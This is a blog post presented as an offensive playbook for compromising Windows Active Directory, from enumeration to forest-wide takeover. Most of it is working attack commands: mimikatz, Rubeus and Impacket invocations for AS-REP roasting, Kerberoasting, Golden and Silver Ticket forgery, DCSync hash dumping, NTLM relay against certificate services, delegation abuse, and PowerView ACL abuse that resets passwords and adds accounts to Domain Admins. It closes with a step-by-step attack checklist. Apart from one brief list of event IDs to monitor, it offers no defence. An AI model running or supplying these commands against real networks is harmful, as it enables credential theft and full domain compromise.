                    <h1 class="blog-title">Active Directory Attack Matrix</h1>
                    <div class="blog-meta">
                        <div class="author">
                            <div class="author-avatar">H</div>
                            <span>hackherway</span>
                        </div>
                        <span>May 28, 2026</span>
                        <span>25 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="adm-intro">
                        Kerberos isn't a protocol. It's a trust exercise that Windows admins fail daily. Active Directory is the digital equivalent of a house where every door has the same key, the windows are painted shut, and the homeowner insists they're "secure" because they bought a Ring doorbell. This is the complete playbook for tearing it apart — from initial enumeration to forest-wide compromise. If you're a blue teamer reading this, I'm sorry. If you're a red teamer, you're welcome.
                    </p>

                    <h2 id="adm-recon">Reconnaissance</h2>
                    <p>
                        Before you break anything, you need to know what you're breaking. AD recon is about mapping the terrain: users, groups, computers, trusts, and the misconfigurations that make it all fall apart.
                    </p>
                    <pre><code># === ENUMERATION TOOLS ===
# BloodHound — the gold standard
# Collect data with SharpHound (C#) or BloodHound.py (Python)
SharpHound.exe -c All
python3 bloodhound.py -u user -p password -d domain.local -ns 10.10.10.10 -c All

# PowerView — PowerShell reconnaissance
# (If you're running this in 2026, PowerView is probably flagged by every EDR ever)
Import-Module PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser | select name, description, pwdlastset
Get-NetGroup | select name, description
Get-NetComputer | select name, operatingsystem
Get-NetShare
Get-NetGPO

# LDAP enumeration (no credentials needed if anonymous binding is enabled)
ldapsearch -x -H ldap://dc01.domain.local -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Kerberos user enumeration (no pre-auth needed)
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt

# SMB enumeration
crackmapexec smb 10.10.10.0/24
enum4linux -a 10.10.10.10

# DNS enumeration
dig @dc01.domain.local domain.local AXFR
dnsenum domain.local

# === KEY DATA POINTS ===
# Domain Admins group members
# Enterprise Admins (forest-wide)
# Service accounts with SPNs (Kerberoast targets)
# Accounts with Kerberos pre-auth disabled (AS-REP roast targets)
# Unconstrained delegation accounts
# Constrained delegation configurations
# ACLs on sensitive objects (Domain Admins, AdminSDHolder)
# Trust relationships (inbound, outbound, bidirectional)
# LAPS passwords (if deployed)</code></pre>

                    <h2 id="adm-kerb">Kerberos Attacks</h2>
                    <p>
                        Kerberos is the authentication protocol that powers AD. It's also a goldmine of vulnerabilities when configured by people who read half a Microsoft doc in 2008 and called it a day.
                    </p>

                    <h3 id="adm-asrep">AS-REP Roasting</h3>
                    <p>
                        Some genius decided that certain accounts don't need to prove who they are before getting a ticket. We thank that genius daily.
                    </p>
                    <pre><code># Find accounts with pre-auth disabled
Get-DomainUser -PreauthNotRequired | select samaccountname

# AS-REP roast with Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# AS-REP roast with Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack the hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# If you get credentials, you're in. No domain access required.
# This works from an unauthenticated position on the network.</code></pre>

                    <h3 id="adm-krbroast">Kerberoasting</h3>
                    <p>
                        Service accounts with SPNs get tickets encrypted with their own password. Request the ticket, crack it offline, enjoy your new service account credentials.
                    </p>
                    <pre><code># Find SPNs
setspn -T domain.local -F -Q */*
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Kerberoast with Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt

# Kerberoast with Impacket
GetUserSPNs.py domain.local/user:password -request -format hashcat -outputfile kerb.txt

# Crack
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# Common weak service account passwords:
# Password123!, Service2024!, CompanyName1!, Spring2024!
# These crack in minutes. Hours if the admin was feeling spicy.</code></pre>

                    <h3 id="adm-golden">Golden Ticket</h3>
                    <p>
                        The Golden Ticket is the master key to the kingdom. If you have the KRBTGT hash, you can forge tickets for any user, any group, any time. It's the "I am the captain now" of Active Directory.
                    </p>
                    <pre><code># Dump KRBTGT hash (requires Domain Admin or DCSync rights)
mimikatz # lsadump::dcsync /user:domain\krbtgt

# Or from a compromised DC
mimikatz # lsadump::lsa /inject /name:krbtgt

# Forge a Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:512 /ptt

# The ticket is valid for 10 years by default
# You can forge it for any user, even non-existent ones
# The /ptt flag injects it directly into your session

# Use the ticket
klist  # verify it's there
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass

# Silver Ticket — forge a service ticket instead of TGT
# Target a specific service (CIFS, HTTP, LDAP) on a specific host
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVER_HASH /ptt</code></pre>

                    <h2 id="adm-ldap">LDAP & ADCS Abuse</h2>
                    <p>
                        Active Directory Certificate Services (ADCS) is Microsoft's PKI implementation. It's also a privilege escalation engine if you know which certificate templates to abuse.
                    </p>
                    <pre><code># === ESC1: Web Enrollment with SAN ===
# Find vulnerable certificate templates
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable

# Request a certificate as any user (Domain Admin)
certipy req -u user@domain.local -p password -dc-ip 10.10.10.10 -ca "CA_NAME" -template "VulnerableTemplate" -upn administrator@domain.local

# Convert PFX to TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# === ESC8: ADCS Web Enrollment Relay ===
# Force authentication to the Web Enrollment endpoint
# Use PetitPotam or PrinterBug to coerce auth
petitpotam.py -d domain.local -u user -p password 10.10.10.10 webenroll.domain.local

# Capture the NTLM relay with ntlmrelayx
ntlmrelayx.py -t http://webenroll.domain.local/certsrv/certfnsh.asp -smb2support --adcs

# === LDAP Signing & Channel Binding ===
# If LDAP signing is not required, relay to LDAP
ntlmrelayx.py -t ldaps://dc01.domain.local --delegate-access -smb2support

# Check for LDAP signing requirements
crackmapexec ldap 10.10.10.10 -u user -p password -M ldap-signing</code></pre>

                    <h2 id="adm-deleg">Delegation Abuse</h2>
                    <p>
                        Delegation lets services act on behalf of users. Unconstrained delegation lets them act on behalf of ANY user. It's like giving your house keys to a dog walker and also telling them they can drive your car, access your bank account, and vote in your name.
                    </p>
                    <pre><code># === UNCONSTRAINED DELEGATION ===
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | select name

# If a user with high privileges connects to this computer,
# their TGT is cached and can be extracted
# Use Rubeus to monitor and harvest
Rubeus.exe monitor /interval:5 /filteruser:administrator

# Extract TGTs from LSASS (requires SYSTEM)
Rubeus.exe triage
Rubeus.exe dump /luid:0x123456 /nowrap

# === CONSTRAINED DELEGATION ===
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# S4U abuse — impersonate any user to the allowed service
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt

# === RESOURCE-BASED CONSTRAINED DELEGATION ===
# If you have GenericWrite on a computer object, you can set RBCD
# to delegate from a compromised account to that computer

# Add RBCD using PowerView
$comp = Get-DomainComputer -Identity targetcomputer
$sid = Get-DomainUser -Identity compromiseduser | select -expand objectsid
Set-DomainObject -Identity $comp -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sid}

# Then use Rubeus S4U2Self
Rubeus.exe s4u /user:compromiseduser /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/targetcomputer.domain.local /ptt</code></pre>

                    <h2 id="adm-acl">ACL Abuse</h2>
                    <p>
                        Access Control Lists in AD are a maze of permissions that nobody audits. If you have WriteDacl, WriteOwner, GenericAll, or GenericWrite on a sensitive object, you can escalate privileges without ever "hacking" anything. You're just using the permissions someone gave you.
                    </p>
                    <pre><code># === COMMON ACL ABUSE PATHS ===
# GenericAll on user → reset password
Set-DomainUserPassword -Identity victimuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on group → add yourself to group
Add-DomainGroupMember -Identity "Domain Admins" -Members youruser

# WriteDacl on object → grant yourself GenericAll
$sid = Get-DomainUser -Identity youruser | select -expand objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;$sid)"
$rawbytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($rawbytes, 0)
Get-DomainObject -Identity victimobject | Set-DomainObject -Set @{'ntsecuritydescriptor'=$rawbytes}

# WriteOwner on object → take ownership, then modify ACLs
Set-DomainObjectOwner -Identity victimobject -OwnerIdentity youruser
Add-DomainObjectAcl -TargetIdentity victimobject -PrincipalIdentity youruser -Rights All

# ForceChangePassword on user → reset their password
Set-DomainUserPassword -Identity victimuser -Reset -NewPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)

# === BLOODHOUND FOR ACL PATHS ===
# Upload data, run queries:
# "Find shortest paths to Domain Admin"
# "Find paths from owned principals"
# "Find users with DCSync rights"
# The GUI literally draws you a map to Domain Admin. It's insultingly easy.</code></pre>

                    <h2 id="adm-dcsync">DCSync</h2>
                    <p>
                        DCSync is the ultimate AD attack. If you have the right permissions (Replicating Directory Changes and Replicating Directory Changes All), you can request password hashes from the Domain Controller without ever touching a DC. It's like calling the bank and asking for everyone's PIN — and the bank just gives it to you because you asked nicely.
                    </p>
                    <pre><code># === WHO CAN DCSYNC? ===
# By default: Domain Admins, Enterprise Admins, Administrators, Domain Controllers
# Check with BloodHound: "Find users with DCSync rights"

# === EXECUTE DCSYNC ===
# With Mimikatz (requires appropriate rights)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:administrator
mimikatz # lsadump::dcsync /domain:domain.local /all

# With Impacket secretsdump.py
secretsdump.py domain.local/administrator:password@dc01.domain.local

# With crackmapexec
cme smb dc01.domain.local -u administrator -p password --ntds

# Extract ALL hashes from NTDS.dit
# This gives you every user's NTLM hash in the domain
# Crack them offline, pass them around, forge Golden Tickets

# === DEFENSE ===
# Monitor for Event ID 4662 (Directory Service Access)
# Monitor for Event ID 5136 (Directory Service Object Modified)
# Look for Replicating Directory Changes rights being granted
# BloodHound helps you find who shouldn't have these rights</code></pre>

                    <h2 id="adm-checklist">Attack Checklist</h2>
                    <ol>
                        <li><strong>Enumerate everything.</strong> BloodHound, PowerView, LDAP queries. Know the terrain before you walk it.</li>
                        <li><strong>Find AS-REP roastable accounts.</strong> No credentials needed. Free passwords.</li>
                        <li><strong>Kerberoast service accounts.</strong> SPNs = tickets = hashes = credentials.</li>
                        <li><strong>Analyze trust relationships.</strong> Parent-child, forest, external. Trusts are bridges. Walk across them.</li>
                        <li><strong>Check delegation configurations.</strong> Unconstrained = free TGTs. Constrained = S4U abuse. RBCD = GenericWrite abuse.</li>
                        <li><strong>Map ACL paths.</strong> BloodHound's shortest paths query is a roadmap to Domain Admin.</li>
                        <li><strong>Abuse ADCS.</strong> ESC1-ESC8 are all privilege escalation. Certipy finds them automatically.</li>
                        <li><strong>DCSync when you have the rights.</strong> One command, every hash in the domain.</li>
                        <li><strong>Forge Golden Tickets.</strong> KRBTGT hash = 10 years of access. Silver Tickets for targeted service abuse.</li>
                        <li><strong>Monitor your own indicators.</strong> If you're not checking logs, someone else is. And they're not on your side.</li>
                    </ol>

                    <blockquote>
                        "Active Directory is not a directory service. It's a distributed privilege escalation framework that happens to also store phone numbers."
                    </blockquote>
